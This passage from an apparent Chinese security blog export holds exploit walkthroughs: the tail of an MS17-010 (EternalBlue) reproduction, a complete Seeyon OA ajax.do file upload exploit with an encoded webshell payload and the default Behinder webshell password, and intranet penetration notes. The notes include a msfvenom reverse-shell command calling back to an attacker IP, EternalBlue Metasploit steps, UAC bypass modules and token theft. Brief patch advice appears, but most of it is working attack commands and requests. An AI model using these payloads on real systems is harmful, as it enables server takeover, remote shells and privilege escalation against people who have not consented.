<p><img src="/images/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9DMS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/9.png" alt="图片"><br>检测无误后执行漏洞</p>
<pre class="line-numbers language-none"><code class="language-none">exploit<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="/images/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9DMS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/10.png" alt="图片"><br>有以上显示即为攻击成功<br>输入shell，显示获取shell成功<br><img src="/images/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9DMS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/11.png" alt="图片"><br>拥有system最高权限<br><img src="/images/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9DMS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/12.png" alt="图片"><br>尝试截图<br>Screenshot<br><img src="/images/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9DMS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/13.png" alt="图片"><br><img src="/images/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9DMS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/14.png" alt="图片"><br><img src="/images/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9DMS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/15.png" alt="图片"></p>
<h3 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p>①在线更新；开启Windows Update更新。<br>②打补丁；此漏洞对应的微软补丁地址：<a href="https://docs.microsoft.com/zh-cn/security-updates/Securitybulletins/2017/ms17-010">https://docs.microsoft.com/zh-cn/security-updates/Securitybulletins/2017/ms17-010</a></p>
]]></content>
      <categories>
        <category>Windows安全</category>
        <category>系统安全</category>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>2017.3</tag>
      </tags>
  </entry>
  <entry>
    <title>【致远OA】ajax.do任意文件上传漏洞复现</title>
    <url>/2021/01/22/%E8%87%B4%E8%BF%9COA-ajax.do%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<h3 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>致远OA是一套办公协同管理软件。近日，奇安信CERT监测到致远OA的相关漏洞信息。由于致远OA旧版本某些接口存在未授权访问，以及部分函数存在过滤不足，攻击者通过构造恶意请求，可在无需登录的情况下上传恶意脚本文件，从而控制服务器。致远OA官方已针对该漏洞提供补丁。鉴于漏洞危害较大，建议用户尽快应用补丁更新。</p>
<h3 id="漏洞影响版本"><a href="#漏洞影响版本" class="headerlink" title="漏洞影响版本"></a>漏洞影响版本</h3><p>致远OA V8.0<br>致远OA V7.1、V7.1SP1<br>致远OA V7.0、V7.0SP1、V7.0SP2、V7.0SP3<br>致远OA V6.0、V6.1SP1、V6.1SP2<br>致远OA V5.x<br>致远OA G6</p>
<h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>访问thirdpartyController.do.css/..;/ajax.do，判断是否存在漏洞</p>
<pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;xxx.xxx.xxx.xxx&#x2F;seeyon&#x2F;thirdpartyController.do.css&#x2F;..;&#x2F;ajax.do<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>出现异常：java.lang.NullPointerException:null<br><img src="/images/%E8%87%B4%E8%BF%9COA-ajax.do%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/1.png" alt="图片"><br>使用工具生成payload，我使用的PoC如下：</p>
<pre class="line-numbers language-none"><code class="language-none">POST &#x2F;seeyon&#x2F;autoinstall.do.css&#x2F;..;&#x2F;ajax.do?method&#x3D;ajaxAction&amp;managerName&#x3D;formulaManager&amp;requestCompress&#x3D;gzip HTTP&#x2F;1.1
Host: 127.0.0.1
Connection: close
Cache-Control: max-age&#x3D;0
Upgrade-Insecure-Requests: 1
User-Agent: Opera&#x2F;9.80 (Macintosh; Intel Mac OS X 10.6.8; U; fr) Presto&#x2F;2.9.168 Version&#x2F;11.52
Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q&#x3D;0.9
Cookie: JSESSIONID&#x3D;7B6D8C106BD599DB0EF2F2E3B794A4FA; loginPageURL&#x3D;; login_locale&#x3D;zh_CN;
Content-Type: application&#x2F;x-www-form-urlencoded
Content-Length: 8819

managerMethod&#x3D;validate&amp;arguments&#x3D;%1F%C2%8B%08%00%00%00%00%00%00%00uTK%C2%93%C2%A2H%10%3E%C3%AF%C3%BE%0A%C3%82%C2%8Bv%C3%B4%C2%8C%C2%8D+c%C2%BB%13%7Bh_%C2%88%28*%28%C2%AF%C2%8D%3D%40%15Ba%15%C2%B0%C3%B2%10%C3%AC%C2%98%C3%BF%C2%BE%05%C3%98%C3%93%3D%C2%B1%C2%BDu%C2%A9%C3%8C%C2%AC%C3%8C%C2%AF%C3%B2%C3%BD%C3%97k%C3%B7%14_H%C2%8E%C2%9DC%C2%95x%C3%9D%3F%C2%98%C3%81%17%C3%A6M%C2%A28%C2%A4%C2%96t3%2F%C3%8D%C2%BA%C3%AF%C3%A2y%C2%99%5C%C2%BC4EqT%3Fj%C3%99%05E%3E%C2%938Y%C3%80%C3%BC%C3%89t%C3%BA%C3%BD%C2%A7%C2%AB%C3%A7%3AI%C2%92%3E%C2%A5%C2%9EW%C3%85%C3%91S%C3%A7%C3%BB%C3%AFL%7B%7E%0B%C2%9D%C3%82%C3%A9%C2%A3%C2%B8%C2%BF%C2%A3%26%C2%99qA%C2%99wa%C2%92w%C2%9A%C2%A3%00%C2%91we%3EQ%C3%AB%C3%95%C3%B8%C2%8F%1D%C2%AD%C2%81%3C%26%C3%90%C3%89%C2%BCA%3FL%C2%93%C2%B2%C3%B3%C3%B0%13%C2%9E%C2%B9%C2%BB%C2%92%06%1E%C3%86%C2%B5%2F%3B1%C2%B9%C2%81YR%C2%B9%C3%9C%C2%98%C2%95%C2%96A%C3%A6%C2%8A%C3%82mKj%19%C2%8B%C2%9C%C2%A5%C3%8A%C2%82Y%5C%C2%AC%C2%B9%24%C2%80d%C2%9E%03%5E%C3%8F%C3%97D%29%5Cm%2C%1F%07%2F%C3%85Q%5CD%C2%B6%26%C3%B9%C2%90%C3%A8%15%C3%A0p%C3%A1%C2%86%2C%C3%9Ah%C3%83J%0A%C2%87%C3%8FN%C2%A4%5C%C2%B7DM%00%C3%91C%28b%C3%8E%C3%96%C2%84%C2%ABe%40%2C%C2%898%03%C3%A2%C2%B8%C2%825%3EYp%C2%96%26%0C%C3%A8%7B%C2%BAFq%C3%9A%C3%B0%C2%A6%C2%9F%5B%C3%BCJ%00K%C2%B5%C3%B8TFqmc%C2%93%C3%8BH*va%C3%B9%0F%C3%A0_%C2%BE%C3%99%C2%A2%1E%C2%BA%C3%A2%C2%A2%C2%B2L5q%C2%B9%C3%A1%C2%A3%24*%C2%A9e*7iq%C3%B4m3%60mC8%C2%83j2%C2%A3%3A7%C3%80%C2%96%C2%85e%C2%A8%18D%C2%99.%C3%8F%5B%C2%BD%C2%838%0E%28F%25%C2%89%C2%9B%C3%84%C3%A3%C2%95%01%C2%A0%C2%B4L%C3%A9-%3F%C2%B8Bc%C2%95%3A%C3%86%C3%86%C3%9Fse%00%C3%B8%C2%8DoW%01%C3%B2L%15K%C2%8B%0CZ%08%C2%8Fh%7C%2C4W%C2%B9%C2%B4l%C3%AD%C3%96D%C3%856%C3%81%C2%B9%7Dl%C2%B1eQJ7%C3%93%12%C2%ADI%C2%89%5D%02Ygz%1E%C2%9DL%C3%B6%C2%99%C3%A6%C2%B4%C3%8E%C3%BB%C3%996j%C2%BDU%40s%40%C3%B3w%C3%8F%5B%C2%A4%C2%84%C2%80%C3%A0%2B%14K%0Cg%C3%82%01.W%C2%89K%C2%80%C3%AF%C3%9CXd%1F%C3%B6%03%C3%BB%C2%B0%C2%A9%C2%B6%C2%86%C2%8D%C2%ADP%3Fo%0F%C3%92%C3%80B%C3%92%08p%C3%BA%C2%AD%C2%A9%01%12%C2%AE%C3%90T%0D%C3%8B%28%07%C2%B6%C3%A6%23%C2%A8I%C2%A9S%C2%9DG%7B%0E_%C2%9D6%C3%86%C3%B1%1B%C2%BD%26%10%C3%839%C2%A6uU%03%C2%97%28X%C2%9E%C2%AE%26%C2%AA%C2%BEA%C3%B2%21%0B%C3%974%06%C3%87%C3%9C%C3%87%1BT%C3%A6%C2%B6%09%C3%BC%23%C2%A7%C2%87u%C2%AC%1A%C2%A7%0BG%7E%C2%82%C2%AD%C3%8A%C2%8F%3F%C3%BC%19%C3%99%C2%BF%C3%BE%C2%99%C3%88%C2%95%C2%84d%C2%AD%C2%91O%C3%AB%7C%C2%81%C3%8AO%C3%96o%C3%B8%C3%9Ay%C3%A4%12%C2%9D%C2%A7%C3%B5%C2%89%C2%A1%18%24%C2%A0j%C3%B4%C3%9A%C3%BA%C3%94z%C2%8D_%C2%BF%C3%96F%C2%9E%C2%9E%C2%A9%1C%C3%84V%25%C2%9C%5D%C3%96%C2%A6%C3%B9X%C2%A4%C2%B2%28%60XMn%C3%90%18%C3%A6%C2%AE%C2%81o%C3%B4m%C2%BA%C3%97%C2%95%C2%85%12%C2%AAs%C2%9A%C3%97%C3%A2n%C2%977%C3%BD%C3%81%C2%A9x%1F%C3%A9%C3%84%C2%A6%C2%BD*%2FW%18%C2%98%3A%06%C3%BC%3E%C2%B79%C2%9D%3D%12%C3%BD%C3%AD%C2%8F%1C%C3%944%C2%9D%5E%C2%97%1Cc%C3%AAgBc%C2%A0%C3%B1%C3%83%C2%95%1B%29%C2%ACe%08%21%C2%8D%C2%8F%C3%BA%C2%A1%C2%97%C3%90X%C2%A4%C2%A0%0A%C2%9A%C2%9E%C3%9Es%C3%A3%1C%C2%8A%C3%BA%10%C3%92%C3%9A%C3%AE%C2%A6%C3%A3%C2%A6%27%01%C2%A7T%C2%8E9a%5DQgw%C3%A1%C2%B5h%C3%AB%C2%BA*%5C%7E%C3%BF%C3%B8%3E%C3%ADL%C2%9AG%7D%C2%82R%C3%90%C2%9F%C2%BCh%C3%B3o%C3%83%C2%99%07bH%07%1E%C3%9E%C3%AFv%C3%96%3FW%C3%AA%C3%BDw%C2%AA%5B%C2%B3%3B%C3%93%C3%9A%C2%B6L%C3%AF%0E%C3%98o%C3%AFI%7E%3AQ%C2%80f%09%3C%7C%C3%A9%1C%0F%C2%8B%C2%AF%C3%8F%1F%C2%97%C3%84%C3%87%7D%C3%93o%18%1C%C3%B5%3E%C2%82%C3%BF%C2%9F.%C3%80q%C3%AAQ%C3%87%7E%7C%C2%AF%C3%B7%21%25%C2%A0wb%C3%92%C3%8C%C3%89%10%60%C3%8A%C2%B2%C3%AC%3D%C2%BCv%7F%C3%90%25I%17%C3%A5k%7Dg%C2%97%C3%9C%C3%AB%C3%BE%C3%BD%2FheA%C3%A4_%05%00%00<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>使用burpsuite上传EXP，漏洞利用成功<br><img src="/images/%E8%87%B4%E8%BF%9COA-ajax.do%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/2.png" alt="图片"><br>利用失败会返回如下：</p>
<pre class="line-numbers language-none"><code class="language-none">&#123;
&quot;message&quot;:&quot;被迫下线，原因：与服务器失去连接&quot;,
&quot;code&quot;:&quot;-1&quot;,
&quot;details&quot;:null
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>请求webshell,证明上传成功<br><img src="/images/%E8%87%B4%E8%BF%9COA-ajax.do%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/3.png" alt="图片"><br>使用冰蝎3进行连接，连接成功<br>Webshell地址:<a href="http://xxx.xxx.xxx.xxx/seeyon/SeeyonUpdate1.jspx">http://xxx.xxx.xxx.xxx/seeyon/SeeyonUpdate1.jspx</a><br>冰蝎3 默认马pass：rebeyond<br><img src="/images/%E8%87%B4%E8%BF%9COA-ajax.do%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/4.png" alt="图片"><br><img src="/images/%E8%87%B4%E8%BF%9COA-ajax.do%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/5.png" alt="图片"></p>
<p>冰蝎下载链接：<a href="https://github.com/rebeyond/Behinder/releases">https://github.com/rebeyond/Behinder/releases</a></p>
<h3 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p>①联系致远OA官方以获取最新相关补丁，升级至最新版本。<br>②限制访问seeyon/thirdpartyController.do.css/..;/ajax.do</p>
]]></content>
      <categories>
        <category>Web安全</category>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>2021.1</tag>
      </tags>
  </entry>
  <entry>
    <title>内网学习笔记①</title>
    <url>/2021/10/30/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E2%91%A0/</url>
    <content><![CDATA[<h3 id="0x00-本文顺序"><a href="#0x00-本文顺序" class="headerlink" title="0x00 本文顺序"></a>0x00 本文顺序</h3><p>内网架构及反弹shell-&gt;信息搜集1-&gt;本地提权-&gt;隧道搭建-&gt;信息搜集2</p>
<p>提权与信息搜集是息息相关、相互嵌套的，你拿到怎样的权限才能获取相对应的信息，<strong>内网渗透就是不断获取信息的过程</strong>。在刚拿到内网机器时你的权限只允许你做简单的信息搜集，而之后需要根据之前搜集的内容进行提权，而要获取内网中其他主机的信息以及后续对于其他主机的渗透又需要隧道进行通信，所以在提权后进行隧道搭建，最后实施进一步的信息搜集。</p>
<h3 id="0x01-内网架构及反弹shell"><a href="#0x01-内网架构及反弹shell" class="headerlink" title="0x01 内网架构及反弹shell"></a>0x01 内网架构及反弹shell</h3><h4 id="Ⅰ-内网环境"><a href="#Ⅰ-内网环境" class="headerlink" title="Ⅰ 内网环境"></a>Ⅰ 内网环境</h4><p>用一张图来表示（其中域名为lce.com）：<br><img src="/images/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E2%91%A0/1.png" alt="图片"><br>可以看到攻击机kali与内网win7可以通信，win7、server2012（域控）和xp在同一个域内（lce.com），其中win7与server2012在同一个局域网，而server2012与xp又在另一个局域网内。</p>
<p>目前情况是我们已经拿到了win7的webshell，接下来我们需要通过kali拿到反弹shell，之后我们再横向拿下域控，再进一步拿下xp这台主机。</p>
<h4 id="Ⅱ-msf反弹shell"><a href="#Ⅱ-msf反弹shell" class="headerlink" title="Ⅱ msf反弹shell"></a>Ⅱ msf反弹shell</h4><p><strong>为什么要反弹shell</strong><br>一般来说目标主机与我们攻击者之间都存在防火墙等安全设备，限制了流入目标主机的流量，导致我们直接连接目标主机会失败。所以我们想让目标主机主动连接我们，这就是反弹shell。<br><strong>如何反弹shell</strong><br>反弹shell的方法有很多，这里推荐使用msfconsole+msfvenom，如果需要免杀还可以生成指令配合混淆免杀，比如Backdoor-factory等等。</p>
<p>我们通过反弹shell，将10.188.16.131的win7的shell反弹给我们的攻击机10.188.10.200的kali。</p>
<pre class="line-numbers language-none"><code class="language-none">1.生成目标文件
    msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp -e x86&#x2F;shikata_ga_nai -i 5 LHOST&#x3D;10.188.10.200 LPORT&#x3D;6666 -f exe &gt; attack.exe
2.通过webshell上传attack.exe到目标主机并运行。
3.打开msf使用
    use exploit&#x2F;multi&#x2F;handler
    set payload windows&#x2F;meterpreter&#x2F;reverse_tcp
    show options 之后设置lpost和lhost即可
    exploit
4.得到反弹的meterpreter

PS：msfvenom参数说明：
        -p –payload &lt; payload&gt; 指定需要使用的payload
        -l payloads 查看所有的攻击载荷
        -e –encoder [encoder] 指定需要使用的encoder
        -i 5 –iterations &lt;count&gt; 指定payload的编码次数为5次
        -f 生成文件格式
        lhost和lport分别为反弹到主机的ip和端口号<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="0x02-信息搜集1"><a href="#0x02-信息搜集1" class="headerlink" title="0x02 信息搜集1"></a>0x02 信息搜集1</h3><p>本机信息搜集（主要任务是探测本机简单信息，为提权和进一步信息搜集做准备，其中有价值的信息主要是网段信息、用户账户和系统信息）<br>常用指令（按照是否常用顺序排列）：</p>
<pre class="line-numbers language-none"><code class="language-none">whoami &#x2F;all     &#x2F;&#x2F;查询当前用户
ipconfig &#x2F;all   &#x2F;&#x2F;列出网络信息
net user        &#x2F;&#x2F;查询当前电脑的用户账户
systeminfo      &#x2F;&#x2F;查询主机信息
tasklist        &#x2F;&#x2F;查询进程列表
query user      &#x2F;&#x2F;查询当前用户以及登陆时间等信息
route print     &#x2F;&#x2F;打印路由
arp -a          &#x2F;&#x2F;打印arp缓存信息
netstat -ano | findstr &quot;3306&quot;   &#x2F;&#x2F;查询相关端口信息
net share       &#x2F;&#x2F;查看共享资源
net session     &#x2F;&#x2F;列出或断开本地计算机和与之连接的客户端的会话
cmdkey list     &#x2F;&#x2F;列出本机凭据
wmic product    &#x2F;&#x2F;查询安装软件信息
wmic service    &#x2F;&#x2F;查询本机服务信息
netsh firewall show config      &#x2F;&#x2F;查看防火墙设置
net statistics workstation      &#x2F;&#x2F;本地工作站或服务器服务的统计记录<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>其中ipconfig和net user以及systeminfo非常重要。</p>
<p>通过ipconfig可以查看到当前主机位于哪个网段，如果还存在其他网段，那么极有可能存在另一个局域网区域。比如上述环境中的win7，既与kali在同一个外网，也存在于另一个网段192.168.174.1中。所以进一步的信息搜集可以对这个网段扫描。<br>通过net user可以查看有哪些用户存在，为下一步的域渗透和提权做准备。<br>通过systeminfo可以查看本机信息，获取哪些补丁没有打，为接下来提权做准备。</p>
<h3 id="0x03-本地提权"><a href="#0x03-本地提权" class="headerlink" title="0x03 本地提权"></a>0x03 本地提权</h3><h4 id="Ⅰ-溢出漏洞提权"><a href="#Ⅰ-溢出漏洞提权" class="headerlink" title="Ⅰ 溢出漏洞提权"></a>Ⅰ 溢出漏洞提权</h4><p><strong>溢出漏洞</strong><br>缓冲区溢出漏洞，是由于恶意代码在执行时，向缓冲区写入超过其长度的内容，造成进程的堆栈被更改，进而执行恶意代码，达到了攻击的目的。</p>
<p>我们主要需要利用工具找出系统相关系统漏洞并加以利用，配合msf或者Cobaltstrike等相关工具实现提权。</p>
<pre class="line-numbers language-none"><code class="language-none">msf &gt; use post&#x2F;windows&#x2F;gather&#x2F;enum_patches

通过已经获取的meterpreter的session查询目标主机存在的可以利用的漏洞<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<pre class="line-numbers language-none"><code class="language-none">windows-exploit-suggester.py -d vulinfo.xls -i systeminfo.txt

其中systeminfo.txt内容是通过systeminfo命令获取的系统信息，里面记录了所有打过的补丁，
windows-exploit-suggester.py这个py文件根据补丁记录与漏洞信息（vulinfo.xls)进行比较，
获得可以利用的相关漏洞。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<pre class="line-numbers language-none"><code class="language-none">import-module Sherlock.ps1
find-allvulns

首先导入Sherlock.ps1这个powershell模块，之后调用find-allvulns查询可以利用的漏洞。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<pre class="line-numbers language-none"><code class="language-none">.\Vulmap.ps1

直接执行脚本Vulmap.ps1，可以自动查询出本机可以利用的漏洞。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<pre class="line-numbers language-none"><code class="language-none">.\KBCollect.ps1             &#x2F;&#x2F;收集信息
.\cve-check.py -u             &#x2F;&#x2F;创建CVEKB数据库
.\cve-check.py -U             &#x2F;&#x2F;更新CVEKB数据库中的hasPOC字段
.\cve-check.py -C -f KB.json  &#x2F;&#x2F;查看具有公开EXP的CVE<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<pre class="line-numbers language-none"><code class="language-none">.\ms17-010-m4ss-sc4nn3r-master.exe 10.188.16.131

查询IP主机是否存在ms17-010漏洞利用。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>当然还有其它方法，这里就不一一列举了。在拿到可以利用的漏洞以后，可以使用msf自带的exploit模块进行攻击，或者在windows-kernel-exploits公开的收集库中查找可以用来提权的exp。</p>
<p>我这里通过msf使用永恒之蓝（ms17-010）拿到win7的system权限。</p>
<pre class="line-numbers language-none"><code class="language-none">msf5 &gt; use exploit&#x2F;windows&#x2F;smb&#x2F;ms17_010_eternalblue
msf5 &gt; show options
msf5 &gt; set rhost 10.188.16.131
msf5 &gt; exploit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p><img src="/images/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E2%91%A0/2.png" alt="图片"></p>
<h4 id="Ⅱ-ByPassUAC"><a href="#Ⅱ-ByPassUAC" class="headerlink" title="Ⅱ ByPassUAC"></a>Ⅱ ByPassUAC</h4><p><strong>关于UAC</strong><br>User Account Control，用户帐户控制是微软为提高系统安全而在Windows Vista中引入的新技术，它要求用户在执行可能会影响计算机运行的操作或执行更改影响其他用户的设置的操作之前，提供权限或管理员密码。也就是说一旦用户允许启动的应用程序通过UAC验证，那么这个程序也就有了管理员权限。<br><img src="/images/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E2%91%A0/3.png" alt="图片"><br>这里我主要介绍使用msf以及另外两个框架内来bypass，以及简单利用CobaltStrike4.0来提权。</p>
<pre class="line-numbers language-none"><code class="language-none">在得到反弹的meterpreter后，我们执行background，将session放到后台，之后，选取bypass模块。
msf5 &gt; use exploit&#x2F;windows&#x2F;local&#x2F;bypassuac &#x2F;&#x2F;或者use exploit&#x2F;windows&#x2F;local&#x2F;bypassuac_injection
                                           &#x2F;&#x2F;或者use exploit&#x2F;windows&#x2F;local&#x2F;bypassuac_vbs
msf5 &gt; show options
msf5 &gt; set session 3    &#x2F;&#x2F;这里的session就是我们反弹shell得到的meterpreter
msf5 &gt; exploit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<pre class="line-numbers language-none"><code class="language-none">这里介绍使用nishang开源框架，主要用于后渗透攻击，存在许多模块，比如提权，端口扫描，后门等等。
首先下载nishang后上传到目标机器（win7），之后使用msf获取的用户权限的shell导入nishang框架，并使用。
import-module .\nishang.psm1    &#x2F;&#x2F;导入
Get-Command -Module nishang     &#x2F;&#x2F;获取可以使用的module
Invoke-PsUACme                &#x2F;&#x2F;使用bypassuac这个模块进行提权<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<pre class="line-numbers language-none"><code class="language-none">最后介绍Empire框架，它类似于msf，也是一款集成的工具。
首先我们需要下载并安装Empire到kali，之后操作类似msf反弹shell，可以获取目标机器的会话（这里略过）。之后bypass提权我们使用usemodule privesc&#x2F;bypassuac这个模块。
&gt; usemodule privesc&#x2F;bypassuac
&gt; info
&gt; set listener w7   &#x2F;&#x2F;这里的w7是之前反弹会话时设置的监听
&gt; execute<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<pre class="line-numbers language-none"><code class="language-none">CobaltStrike4.0（大名鼎鼎QAQ）
以kali为例讲解
下载好以后进入其目录，打开两个终端以便于后续操作，以下指令最好用root权限执行。
.&#x2F;teamserver 10.188.10.200 pass &#x2F;&#x2F;终端1执行，IP是本机地址，pass是自己设置的密码（一会要用）
.&#x2F;start.sh                      &#x2F;&#x2F;终端2执行，打开CobaltStrike界面，输入用户名（随意）和密码（刚才设置的）
Cobalt Strike-&gt;Listenners   &#x2F;&#x2F;界面操作，创建listener
Attacks-&gt;Packages-&gt;Windows Executable  &#x2F;&#x2F;生成反弹shell的文件，生成后上传到目标主机win7，并运行
类似于meterpreter，我们会获得一个beacon用来执行命令。
之后进行提权，我们这里选择uac提权，也可以选择其他方式。以图来说明。

CobaltStrike还有其他许多用处比如：桌面交互、进程列表、端口扫描、代理、钓鱼等功能，
域内功能包括mimikatz、hashdump、金票据等等，我们之后也会陆续介绍。可以说CobaltStrike是一款强大的图形化的内网工具。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><img src="/images/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E2%91%A0/4.png" alt="图片"><br><img src="/images/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E2%91%A0/5.png" alt="图片"></p>
<h4 id="Ⅲ-令牌窃取"><a href="#Ⅲ-令牌窃取" class="headerlink" title="Ⅲ 令牌窃取"></a>Ⅲ 令牌窃取</h4><p><strong>关于Token</strong><br>Windows有两种类型的Token：<br>1.Delegation token(授权令牌):用于交互会话登录(例如本地用户直接登录、远程桌面登录)<br>2.Impersonation token(模拟令牌):用于非交互登录(利用net use访问共享文档夹)</p>
<p>另外，两种token只在系统重启后清除。具有Delegation token的用户在注销后，该Token将变成Impersonation token，依旧有效。</p>
<p>这里介绍两种方式使用令牌窃取进行提权。</p>
<pre class="line-numbers language-none"><code class="language-none">incognito：exe&#x2F;msf均可，msf中的incognito是从windows中的exe文件中移植过去的，这里以msf自带的incognito为例。
首先我们进入之前获取的meterpreter
msf5 &gt; session 3
meterpreter &gt; load incognito                            &#x2F;&#x2F;加载incognito（除了incognito外还可以加载其他插件比如mimikatz，我们之后会用到）
meterpreter &gt; getuid                                    &#x2F;&#x2F;查看当前token 
meterpreter &gt; list_tokens -u                            &#x2F;&#x2F;列出可用token
meterpreter &gt; impersonate_token &quot;NT AUTHORITY\\SYSTEM&quot;   &#x2F;&#x2F;token窃取，格式为impersonate_token&quot;主机名\\用户名&quot;
meterpreter &gt; getuid                                    &#x2F;&#x2F;查看当前token 
meterpreter &gt; rev2self                                  &#x2F;&#x2F;返回之前的token

windows平台下的incognito.exe操作与此类似。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<pre class="line-numbers language-none"><code class="language-none">rotten potato+meterpreter，适用于当没有Impersonmate Token时的情况。
首先上传rottenpotato.exe到目标主机
meterpreter &gt; list_tokens -u                            &#x2F;&#x2F;此时只有当前用户令牌
meterpreter &gt; execute -cH -f rottenpotato.exe           &#x2F;&#x2F;执行rottenpotato模仿system令牌
meterpreter &gt; list_tokens -u                            &#x2F;&#x2F;此时会有system权限的模仿令牌
meterpreter &gt; impersonate_token &quot;NT AUTHORITY\\SYSTEM&quot;   &#x2F;&#x2F;token窃取<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h4 id="Ⅳ-系统配置错误提权"><a href="#Ⅳ-系统配置错误提权" class="headerlink" title="Ⅳ 系统配置错误提权"></a>Ⅳ 系统配置错误提权</h4><p><strong>可信任服务路径</strong></p>
<p><strong>包含空格且没有引号的路径漏洞</strong><br>计算机系统管理员在配置相关服务时，会指定可执行文件的路径，但是如果服务的二进制路径未包含在引号中，则操作系统将会执行找到的空格分隔的服务路径的第一个实例。<br>比如：C:\Program Files\Vul file\example.exe<br>尝试依次执行：C:\Program.exe、C:\Program Files\Vul.exe、C:\Program Files\Vul file\example.exe</p>
<p>如果可以找到这样的路径，我们只需要写的权限，可以放置一个恶意文件，让操作系统把恶意文件执行。<br><strong>查找可信任服务路径</strong></p>
<pre class="line-numbers language-none"><code class="language-none">使用wmic查询：
wmic service get name,displayname,pathname,startmode |findstr &#x2F;i &quot;Auto&quot; |findstr &#x2F;i &#x2F;v &quot;C:\Windows\\&quot; |findstr &#x2F;i &#x2F;v &quot;&quot;&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<pre class="line-numbers language-none"><code class="language-none">使用msf
